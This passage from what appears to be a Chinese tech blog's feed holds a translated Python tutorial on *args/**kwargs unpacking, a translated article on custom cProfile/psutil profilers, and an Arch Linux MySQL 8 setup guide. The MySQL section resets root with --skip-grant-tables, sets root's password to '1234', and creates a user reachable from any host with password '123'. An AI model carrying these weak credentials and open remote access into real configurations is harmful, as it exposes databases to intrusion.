3]</span><br></pre></td></tr></table></figure></p><p>注意，这个列表的打印方式，以及相应的括号和逗号。</p><p>现在，尝试将解包操作符 * 放到你的列表名前面:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># print_unpacked_list.py</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">print(*my_list)</span><br></pre></td></tr></table></figure></p><p>在这里，解包运算符* 告诉print() 先解包这个列表<br>在这种情况，输出不再是列表本身，而是列表的内容:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_unpacked_list.py</span><br><span class="line">1 2 3</span><br></pre></td></tr></table></figure></p><p>你可以看出这个与之前执行的print_list.py的区别么？<br>除了列表外，print() 还使用了三个单独的参数做为输入。</p><p>你会注意到另一个事实是 ，在print_unpakced_list.py中 ，你是用解包操作符* 去调用函数，而不是在定义函数中，在这种情况 print() 会将列表中所有元素视为单个独立的参数。</p><p>你也可以使用这个方法调用你自己的函数，但是如果你的函要求特定数量的参数，这个可解包的迭代对象必须拥有同样数量的参数。</p><p>为了测试这个行为，考虑这个脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unpacking_call.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    print(a + b + c)</span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_sum(*my_list)</span><br></pre></td></tr></table></figure></p><p>这里,my_sum() 明确指出要求a,b,c三个参数。<br>如果你运行这个脚本，你将得到my_list 里这三个数的和:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python unpacking_call.py</span><br><span class="line">6</span><br></pre></td></tr></table></figure></p><p>my_list 的三个元素和my_sum 要求的参数正好匹配。</p><p>现在让我们跟随这个脚本，当我的my_list 里有4个参数而不是3个会怎样:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wrong_unpacking_call.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    print(a + b + c)</span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">my_sum(*my_list)</span><br></pre></td></tr></table></figure></p><p>这个例子，my_sum 仍然只需要3个参数，但是* 操作给了4个元素，如果你尝试执行这个脚本，你将看到Python 解释器无法运行它:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python wrong_unpacking_call.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"wrong_unpacking_call.py"</span>, line 6, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    my_sum(*my_list)</span><br><span class="line">TypeError: my_sum() takes 3 positional arguments but 4 were given</span><br></pre></td></tr></table></figure></p><p>当你使用*操作符去解包一个列表并作为参数传递给函数时，就像你要单独把每一个参数传递进去一样。这意味着你可以使用多个解包操作符去从几个列表中获取值并把他们一起传递给一个函数。</p><p>为了测试这个特性，思考下面的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sum_integers_args_3.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sum</span><span class="params">(*args)</span>:</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> args:</span><br><span class="line">        result += x</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list2 = [<span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">list3 = [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">print(my_sum(*list1, *list2, *list3))</span><br></pre></td></tr></table></figure></p><p>如果你运行这个例子，这3个列表都被解包。每一个元素都被传递到my_sum(),从而产生下面这个输出:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sum_integers_args_3.py</span><br><span class="line"><span class="number">45</span></span><br></pre></td></tr></table></figure></p><p>解包操作符还有其他实用用法。例如，结舌你需要把一个列表分割成三个不同部分，这个输出应该显示第一个值，最后一个值，和中间所有的值。通过解包操作符号，你可以只用一行代码做到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># extract_list_body.py</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">a, *b, c = my_list</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></p><p>在这个例子,my_list 包含6个元素。第一个值分配给a，最后一个值分配给c，剩下所有其他元素分配给新列表b。如果你运行这个脚本，print() 将如你预期的打印这3个变量:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python extract_list_body.py</span><br><span class="line">1</span><br><span class="line">[2, 3, 4, 5]</span><br><span class="line">6</span><br></pre></td></tr></table></figure><p>使用解包操作符* 可以做的另一件事就是分割任何可以迭代的对象。如果你需要合并两个列表，这可能非常有用:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># merging_lists.py</span></span><br><span class="line">my_first_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_second_list = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">my_merged_list = [*my_first_list, *my_second_list]</span><br><span class="line"></span><br><span class="line">print(my_merged_list)</span><br></pre></td></tr></table></figure></p><p>解包操作符* 被放在 my_first_list 和my_second_list 前面：</p><p>如果你运行这个脚本，看到的结果是列表被合并了:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python merging_lists.py</span><br><span class="line">[1, 2, 3, 4, 5, 6]</span><br></pre></td></tr></table></figure></p><p>你也可以用使用解包操作符**去合并两个字典:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># merging_dicts.py</span></span><br><span class="line">my_first_dict = &#123;<span class="string">"A"</span>: <span class="number">1</span>, <span class="string">"B"</span>: <span class="number">2</span>&#125;</span><br><span class="line">my_second_dict = &#123;<span class="string">"C"</span>: <span class="number">3</span>, <span class="string">"D"</span>: <span class="number">4</span>&#125;</span><br><span class="line">my_merged_dict = &#123;**my_first_dict, **my_second_dict&#125;</span><br><span class="line"></span><br><span class="line">print(my_merged_dict)</span><br></pre></td></tr></table></figure></p><p>在这里可迭代对象是 my_first_dict 和 my_second_dict。</p><p>执行这个代码输出合并字典:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python merging_dicts.py</span><br><span class="line">&#123;<span class="string">'A'</span>: 1, <span class="string">'B'</span>: 2, <span class="string">'C'</span>: 3, <span class="string">'D'</span>: 4&#125;</span><br></pre></td></tr></table></figure></p><p>记住这个*操作符可以用于任何可迭代对象，它也可以迭代一个字符串。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># string_to_list.py</span></span><br><span class="line">a = [*<span class="string">"RealPython"</span>]</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure></p><p>在Python里，字符串也是一个可迭代对象，所以*将解包所有单个值放在列表a中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python string_to_list.py</span><br><span class="line">[<span class="string">'R'</span>, <span class="string">'e'</span>, <span class="string">'a'</span>, <span class="string">'l'</span>, <span class="string">'P'</span>, <span class="string">'y'</span>, <span class="string">'t'</span>, <span class="string">'h'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>]</span><br></pre></td></tr></table></figure></p><p>前面的示例看起来不错，但是当你使用这些运算符时，请务必记住Tim Peters撰写的<a href="https://www.python.org/dev/peps/pep-0020/" target="_blank" rel="noopener">《Python之禅》</a>的第七条：可读性很重要。</p><p>要了解原因，请思考以下代码:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysterious_statement.py</span></span><br><span class="line">*a, = <span class="string">"RealPython"</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure></p><p>有解包运算符*,后面跟着变量，逗号，和赋值号。被打包成一行！事实上，这和之前那个例子没有什么不同。只是RealPython字符串被赋值到新列表a中，感谢解包操作符*。</p><p>a后面的逗号可以解决问题，当你使用解包操作给变量赋值时，Python要求你的结果变量是列表或元组。逗号结尾，你实际只定义了一个变量名为a的元组。</p><p>尽管这是一个非常巧妙的技巧，很多Pythonistas(更Python风格的使用者)都不认为这样的代码有很好的可读性，因此，最好谨慎使用这种数据结构。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>你现在可以使用 *args和 **kwargs去接受可变数量的参数在你的函数里。你也了解了更多关于解包操作符的知识。</p><p>你已经了解了：</p><ul><li>*args 和**kwargs 的含义</li><li>如何使用 *args 和 **kwargs 定义函数</li><li>如何使用单星号(*)解包可迭代对象</li><li>如何使用双星号(**)解包字典</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文用于练习英文阅读，如有侵权，联系删除&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://realpython.com/python-kwargs-and-args/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt;是&lt;strong&gt;Davide Mastromatteo&lt;/strong&gt;Python args and kwargs: Demystified&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://xiaotaoist.github.io/categories/Python/"/>
    
    
      <category term="English" scheme="https://xiaotaoist.github.io/tags/English/"/>
    
  </entry>
  
  <entry>
    <title>分析Python程序性能 （译）</title>
    <link href="https://xiaotaoist.github.io/2019/09/07/custom-python-profiler/"/>
    <id>https://xiaotaoist.github.io/2019/09/07/custom-python-profiler/</id>
    <published>2019-09-07T05:21:00.000Z</published>
    <updated>2019-09-07T09:04:47.504Z</updated>
    
    <content type="html"><![CDATA[<p>本文用于练习英文阅读，如有侵权，联系删除</p><p><a href="https://pythonspeed.com/articles/custom-python-profiler/" target="_blank" rel="noopener">原文链接</a>是<strong>Itamar Turner-Trauring</strong>写的Not just CPU:writing custom profilers for Python</p><a id="more"></a><p><strong>以下为译文</strong><br>如果你的程序运行缓慢，并且你确定仅<a href="https://pythonspeed.com/articles/blocking-cpu-or-io/" target="_blank" rel="noopener">部分归因于CPU</a>,你该如何确定代码的那一部分正在等待CPU以外的时间呢？</p><p>在本文中，你将学习如何编写自定义的分析器，并帮你精确分析定位代码运行具体消耗的时间。特别的，我们将讨论:</p><ul><li>你的程序具体时间消耗情况</li><li>分析非CPU等待时间</li><li>分析非自愿上下文切换消耗的时间</li></ul><h1 id="你的程序在等待什么？"><a href="#你的程序在等待什么？" class="headerlink" title="你的程序在等待什么？"></a>你的程序在等待什么？</h1><p>有些时候你的程序时间花费在CPU以外的地方，可能是:</p><ul><li><strong>网络通讯</strong>.可能包括DNS查询，等待对方响应，等待所有数据加载完成，等等。</li><li><strong>硬盘读写</strong>. 从硬盘读写数据需要一些延迟，有时会先写入内存缓存，这很快。有时会直接写入硬盘，比较慢。</li><li><strong>锁</strong>.程序也可能等待线程/进程锁释放</li><li><strong>睡眠</strong>.有时你的程序会主动等待，比如等待一段时间后重试或退出。</li></ul><p>那如何找到这些具体发生了什么操作呢？</p><h1 id="技巧＃1-非CPU运行时间"><a href="#技巧＃1-非CPU运行时间" class="headerlink" title="技巧＃1 非CPU运行时间"></a>技巧＃1 非CPU运行时间</h1><p>Python 内置的<code>cProfile</code> 分析器可以分析你的程序调用情况，你可以用它分析非CPU时间占用情况。</p><p>正如我上一篇文章中所讨论的那样，你的操作系统可以告诉你<a href="https://pythonspeed.com/articles/blocking-cpu-or-io/" target="_blank" rel="noopener">程序使用了CPU多少秒</a>。</p><p>让我们假设有一个单线程程序(多线程程序更难分析和推理),如果你的程序运行共花费了9秒，使用了7.5秒的CPU,这意味着有1.5秒花费在等待上。</p><p>首先，构建一个测量非CPU时间的计时器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_cpu_time</span><span class="params">()</span>:</span></span><br><span class="line">    times = os.times()</span><br><span class="line">    <span class="keyword">return</span> times.elapsed - (times.system + times.user)</span><br></pre></td></tr></table></figure><p>接着，创建一个使用上面新创建的计时器的分析器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cProfile, pstats</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile_not_cpu_time</span><span class="params">(f, *args, **kwargs)</span>:</span></span><br><span class="line">    prof = cProfile.Profile(not_cpu_time)</span><br><span class="line">    prof.runcall(f, *args, **kwargs)</span><br><span class="line">    result = pstats.Stats(prof)</span><br><span class="line">    result.sort_stats(<span class="string">"time"</span>)</span><br><span class="line">    result.print_stats()</span><br></pre></td></tr></table></figure></p><p>现在，你可以用它分析各种函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line"><span class="comment">#分析打开一个网页</span></span><br><span class="line">profile_not_cpu_time(</span><br><span class="line">    <span class="keyword">lambda</span>: urlopen(<span class="string">"https://pythonspeed.com"</span>).read())</span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line">    <span class="number">659</span> function calls (<span class="number">658</span> primitive calls) <span class="keyword">in</span> <span class="number">0.640</span> seconds</span><br><span class="line">    Ordered by: internal time</span><br><span class="line">    ncalls  tottime  percall  filename:lineno(function)</span><br><span class="line">        <span class="number">3</span>    <span class="number">0.050</span>    <span class="number">0.017</span>   _ssl._SSLSocket.read</span><br><span class="line">        <span class="number">1</span>    <span class="number">0.040</span>    <span class="number">0.040</span>   _socket.getaddrinfo</span><br><span class="line">        <span class="number">1</span>    <span class="number">0.020</span>    <span class="number">0.020</span>   _socket.socket.connect</span><br><span class="line">        <span class="number">1</span>    <span class="number">0.010</span>    <span class="number">0.010</span>   _ssl._SSLSocket.do_handshake</span><br><span class="line">    <span class="number">342</span>    <span class="number">0.010</span>    <span class="number">0.000</span>   find.str</span><br><span class="line">    <span class="number">192</span>    <span class="number">0.010</span>    <span class="number">0.000</span>   append.list</span><br></pre></td></tr></table></figure></p><p>我们可以看到大多数时间花费在了从套接字读取上(read)，但DNS查询(getaddrinfo),TCP握手(connect),以及TLS/SSL握手也需要一些时间。</p><p>由于我们小心避免了计算CPU时间，我们可以知道这纯粹是等待时间，不包含CPU占用花费。</p><blockquote><p><strong>注意</strong>:为什么会有<code>str.find</code> 和<code>list.append</code>? 他们不需要任何等待，所以这可能是整个程序没有被运行，也可能因为某些其他程序安排的运行，或者是有时需要从swap交换分区加载到内存里。这意味着发生一些时间消耗，但并不算在CPU占用时间里。</p></blockquote><h1 id="技巧-2-主动上下文切换"><a href="#技巧-2-主动上下文切换" class="headerlink" title="技巧#2 主动上下文切换"></a>技巧#2 主动上下文切换</h1><p>测量非CPU占用时间可能因为一些不受程序控制的行为，导致结果有些不同。有时DNS查询会变得很慢，有时下载花费的时间会很长。<em>因此我们想使用一个更精准的测量方式，它不受外部条件变化影响。</em></p><p>要做到这一点的方法之一是 测量进程做了多少次需要等待的操作：计算等待次数，而不是等待时间。</p><p>这是你如何去做。当你的进程停止使用CPU资源，可能有一下两个原因:</p><pre><code>1. 每次作一个不会立刻返回结果的操作,诸如 读取socket(套接字)，sleeping(休眠)等等，他会告诉操作系统:&quot;等返回结果了再唤醒我&quot;这是“主动上下文切换”,CPU可以切换运行其他的程序，直到从socket里读取到了数据，休眠结束等等再切换回来。2. 被动上下文切换， 这时操作系统暂时停止运行这个进程，以运行其他需要使用CPU的进程。</code></pre><p>因此，出于我们的目的，我们想分析主动上下文切换所花费的时间。</p><p>你可以使用<code>psutil</code>库去写一个分析器，测量主动上下文切换消耗<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line"></span><br><span class="line">_current_process = psutil.Process()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile_voluntary_switches</span><span class="params">(f, *args, **kwargs)</span>:</span></span><br><span class="line">    prof = cProfile.Profile(</span><br><span class="line">        <span class="keyword">lambda</span>: _current_process.num_ctx_switches().voluntary)</span><br><span class="line">    prof.runcall(f, *args, **kwargs)</span><br><span class="line">    result = pstats.Stats(prof)</span><br><span class="line">    result.sort_stats(<span class="string">"time"</span>)</span><br><span class="line">    result.print_stats()</span><br></pre></td></tr></table></figure></p><p>你可以再次分析网络请求的代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line"><span class="comment">#分析打开一个网页</span></span><br><span class="line">profile_voluntary_switches(</span><br><span class="line">    <span class="keyword">lambda</span>: urlopen(<span class="string">"https://pythonspeed.com"</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line">ncalls  tottime  percall  filename:lineno(function)</span><br><span class="line">     <span class="number">3</span>    <span class="number">7.000</span>    <span class="number">2.333</span>  _ssl._SSLSocket.read</span><br><span class="line">     <span class="number">1</span>    <span class="number">2.000</span>    <span class="number">2.000</span>  _ssl._SSLSocket.do_handshake</span><br><span class="line">     <span class="number">1</span>    <span class="number">2.000</span>    <span class="number">2.000</span>  _socket.getaddrinfo</span><br><span class="line">     <span class="number">1</span>    <span class="number">1.000</span>    <span class="number">1.000</span>  _ssl._SSLContext.set_default_verify_path</span><br><span class="line">     <span class="number">1</span>    <span class="number">1.000</span>    <span class="number">1.000</span>  _socket.socket.connect</span><br></pre></td></tr></table></figure></p><p>现在看到的不是花费的等待时间，而是主动上下文切换发生的次数。</p><h1 id="分析所有消耗"><a href="#分析所有消耗" class="headerlink" title="分析所有消耗"></a>分析所有消耗</h1><p>使用分析技术会带来一些额外成本:因为额外的开销导致你的程序变慢一些。大多数情况对结果影响不大，因为你没有分析CPU。</p><p>通常，你可以分析任何数据。例如:</p><ul><li>读操作(psutil.Process().read_count)和写操作(psutil.Process().write_count))数</li><li>在Linux上，读写的总字节数( psutil.Process().read_chars)</li><li>内存分配分析(这需要一些额外的工作，但也可以使用 <a href="http://jemalloc.net/" target="_blank" rel="noopener">jemalloc</a>)</li></ul><p>你也可以看<a href="https://psutil.readthedocs.io/en/latest/#processes" target="_blank" rel="noopener">psutil的文档</a>进一步了解上面两点。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文用于练习英文阅读，如有侵权，联系删除&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pythonspeed.com/articles/custom-python-profiler/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt;是&lt;strong&gt;Itamar Turner-Trauring&lt;/strong&gt;写的Not just CPU:writing custom profilers for Python&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://xiaotaoist.github.io/categories/Python/"/>
    
    
      <category term="English" scheme="https://xiaotaoist.github.io/tags/English/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 8.0.16 安装配置(Arch Linux)</title>
    <link href="https://xiaotaoist.github.io/2019/07/06/mysql8/"/>
    <id>https://xiaotaoist.github.io/2019/07/06/mysql8/</id>
    <published>2019-07-06T06:58:42.000Z</published>
    <updated>2019-07-07T02:45:36.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL与MariaDB"><a href="#MySQL与MariaDB" class="headerlink" title="MySQL与MariaDB"></a>MySQL与MariaDB</h2><p><a href="https://zh.wikipedia.org/zh-hans/MariaDB" target="_blank" rel="noopener">MariaDB</a> 是 MySQL 的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。所以现在主流的 Linux 发行版基本都默认使用 MariaDB 作为默认的 MySQL 实现。ArchLinux 已经将Oracle的MySQL移至<a href="https://aur.archlinux.org/packages/mysql/" target="_blank" rel="noopener">AUR</a> 中。</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>yay -S mysql<blockquote><p>#根据说明初始化MySQL<br>sudo mysqld –initialize –user=mysql –basedir=/usr –datadir=/var/lib/mysql # 此操作会给你生成一个随机root密码(临时)<br>#启动　mysql 服务<br>sudo systemctl start mysqld<br>#可以进行一些安全设置，更改root密码，设置密码复杂度要求，禁止远程登录root帐号等　(建议)<br>mysql_secure_installation</p></blockquote></li></ul><h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h3><ul><li>error while loading shared libraries: libicuuc.so.63: cannot open shared object file: No such file or directory<br>目前(2019-05-21)　Arch Linux 的<a href="https://www.archlinux.org/packages/core/x86_64/icu/" target="_blank" rel="noopener">ICU</a>已经更新到64版了(Unicode组件标准库,以支持世界语言，实现最新版本的Unicode编码标准和Unicode区域设置数据)，而AUR仓库里的MySQL还依赖icu63版，这里可以去AUR仓库里安装<a href="https://aur.archlinux.org/packages/icu63/" target="_blank" rel="noopener">icu63</a>版。<blockquote><p>yay -S icu63</p></blockquote></li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>MySQL配置文件说明里不建议直接编辑默认配置文件, 我们可以自定义一个配置文件，追加到<code>/etc/mysql/my.cnf</code><blockquote><p>#加载我们自定义的配置文件 /etc/mysql/myl.cnf<br>sudo tee -a /etc/mysql/my.cnf &lt;&lt;&lt; “!include /etc/mysql/myl.cnf”</p></blockquote></li><li>编辑配置文件 <code>sudo vim /etc/mysql/myl.cnf</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> [mysql]</span><br><span class="line"> #配置mysql 命令提示符前缀 [主机名][用户名]@[数据库名] (当前时间)</span><br><span class="line"> prompt=[\h][\u]@[\d] (\R:\m)&gt;</span><br><span class="line"> </span><br><span class="line"> #开启自动补全　/ no-auto-rehash 关闭</span><br><span class="line"> auto-rehash</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line"> #事务隔离级别:读提交</span><br><span class="line"> transaction-isolation=READ-COMMITTED</span><br><span class="line"></span><br><span class="line"> #持久化 redolog　到磁盘，保证异常重启不丢数据　默认１,0关闭</span><br><span class="line"> innodb_flush_log_at_trx_commit=1</span><br><span class="line"></span><br><span class="line"> #持久化 binlog,保证异常重启不丢日志 默认１</span><br><span class="line"> sync_binlog=1</span><br></pre></td></tr></table></figure></li></ul><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="重置-MySQL-root-密码"><a href="#重置-MySQL-root-密码" class="headerlink" title="重置 MySQL root 密码"></a>重置 MySQL root 密码</h3><p>现在主流Linux发行版基本全部使用systemd作为系统和服务管理器,可以使用systemd 配置 mysqld服务，不再使用mysql_safe。</p><ol><li>停止mysqld守护进程<blockquote><p>sudo systemctl stop mysqld</p></blockquote></li><li>配置MYSQLD_OPTS环境变量(不启用授权表，不启用网络环境)<blockquote><p>sudo systemctl set-environment MYSQLD_OPTS=”–skip-grant-tables –skip-networking”</p></blockquote></li><li>重新启动mysql<blockquote><p>sudo systemctl start mysqld</p></blockquote></li><li>使用空密码重新登录root账户<blockquote><p>mysql -u root -p</p></blockquote></li><li>清空root 密码<blockquote><p>UPDATE mysql.user SET authentication_string=null WHERE User=’root’;</p></blockquote></li><li>取消特权模式，重新启动mysqld服务<blockquote><p>sudo systemctl unset-environment MYSQLD_OPTS<br>sudo systemctl restart mysqld</p></blockquote></li><li>更新 root 密码 为 1234<blockquote><p>mysql -u root -p<br>use mysql<br>ALTER USER ‘root‘@’localhost’ IDENTIFIED WITH caching_sha2_password BY ‘1234’;</p></blockquote></li></ol><h3 id="添加新用户并授权"><a href="#添加新用户并授权" class="headerlink" title="添加新用户并授权"></a>添加新用户并授权</h3><ul><li>创建 名为test 密码为123，支持远程登录(%), 使用旧版MySQL密码认证算法(MySQL8引入caching_sha2_password, 之前版本使用mysql_native_password)的用户<blockquote><p>CREATE USER ‘test‘@’%’ IDENTIFIED WITH mysql_native_password BY ‘123’;</p></blockquote></li><li>授权 test 用户对test 数据库拥有所有权限<blockquote><p>GRANT ALL ON test.* TO ‘test‘@’%’;</p></blockquote></li></ul><h2 id="深入学习"><a href="#深入学习" class="headerlink" title="深入学习"></a>深入学习</h2><ul><li><a href="https://book.douban.com/subject/3354490/" target="_blank" rel="noopener">《MySQL必知必会》</a></li><li><a href="https://www.imooc.com/learn/117" target="_blank" rel="noopener">数据库设计那些事</a></li><li><a href="https://time.geekbang.org/column/intro/139" target="_blank" rel="noopener">MySQL实战45讲</a></li><li><a href="https://book.douban.com/subject/23008813/" target="_blank" rel="noopener">《高性能MySQL》</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://stackoverflow.com/questions/33510184/change-mysql-root-password-on-centos7/34207996#34207996" target="_blank" rel="noopener">https://stackoverflow.com/questions/33510184/change-mysql-root-password-on-centos7/34207996#34207996</a></li><li><a href="https://wiki.archlinux.org/index.php/MariaDB_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/MariaDB_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li><li><a href="https://dev.mysql.com/doc/refman/8.0/en/option-files.html" 